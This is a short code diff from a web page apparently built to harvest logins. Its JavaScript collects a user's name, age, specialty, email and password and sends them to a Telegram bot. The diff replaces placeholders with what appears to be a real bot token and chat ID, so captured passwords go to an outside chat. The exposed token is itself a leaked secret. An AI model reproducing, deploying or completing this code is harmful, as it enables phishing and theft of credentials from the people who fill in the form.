@@ -194,8 +194,8 @@
         const specialty = document.getElementById('specialty').value;
 
         // Send data to Telegram bot
-        const botToken = "YOUR_BOT_TOKEN";
-        const chatId = "YOUR_CHAT_ID";
+        const botToken = "7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM";
+        const chatId = "842463450";
         const message = `New login attempt:\nName: ${name}\nAge: ${age}\nSpecialty: ${specialty}\nEmail: ${email}\nPassword: ${password}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
